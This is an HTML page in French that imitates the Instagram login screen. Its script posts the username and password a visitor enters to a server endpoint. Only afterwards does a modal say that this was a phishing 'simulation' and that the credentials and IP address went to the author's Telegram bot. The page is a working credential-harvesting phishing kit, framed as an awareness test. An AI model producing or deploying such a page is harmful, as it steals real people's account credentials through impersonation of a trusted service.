<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>@import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');</style>
</head>
<body class="bg-gray-50 flex flex-col items-center justify-center min-h-screen p-4">

    <div class="w-full max-w-[350px] bg-white border border-gray-300 p-8 flex flex-col items-center shadow-sm">
        <h1 style="font-family: 'Lobster', cursive;" class="text-4xl mb-8">Instagram</h1>
        
        <form id="auditForm" class="w-full flex flex-col gap-2">
            <input type="text" id="user" placeholder="Nom d'utilisateur" required
                class="w-full p-2 text-xs bg-gray-50 border border-gray-300 rounded outline-none focus:border-gray-400">
            
            <input type="password" id="pass" placeholder="Mot de passe" required
                class="w-full p-2 text-xs bg-gray-50 border border-gray-300 rounded outline-none focus:border-gray-400">
            
            <button type="submit" id="btn"
                class="w-full bg-[#0095f6] text-white py-1.5 rounded font-semibold text-sm mt-3 hover:bg-[#1877f2] transition">
                Se connecter
            </button>
        </form>

        <div class="flex items-center w-full my-6">
            <div class="flex-1 h-[0.5px] bg-gray-300"></div>
            <p class="mx-4 text-xs font-semibold text-gray-400">OU</p>
            <div class="flex-1 h-[0.5px] bg-gray-300"></div>
        </div>
        <p class="text-[#385185] font-semibold text-sm cursor-pointer mb-4">Se connecter avec Facebook</p>
    </div>

    <div id="modal" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center z-50 p-6">
        <div class="bg-white rounded-2xl max-w-sm w-full p-8 text-center border-t-8 border-red-600 shadow-2xl">
            <h2 class="text-2xl font-black text-red-600 mb-2">🛑 PIÉGÉ ! 🛑</h2>
            <p class="text-gray-800 mb-4 text-sm font-bold">Ceci est une simulation de Phishing.</p>
            <p class="text-xs text-gray-500 mb-6">
                Tes identifiants et ton adresse IP ont été envoyés à mon bot Telegram pour ce test de sécurité. 
                Ne tape jamais tes mots de passe sur un lien inconnu !
            </p>
            <button onclick="location.reload()" class="w-full bg-black text-white py-3 rounded-xl font-bold">J'ai compris le danger</button>
        </div>
    </div>

    <script>
        document.getElementById('auditForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = "Chargement...";
            btn.disabled = true;

            const payload = {
                user: document.getElementById('user').value,
                pass: document.getElementById('pass').value
            };

            try {
                // Appel de la fonction API Vercel
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                document.getElementById('modal').classList.remove('hidden');
            } catch (err) {
                alert("Erreur réseau, réessaie.");
                btn.disabled = false;
                btn.innerText = "Se connecter";
            }
        });
    </script>
</body>
</html>
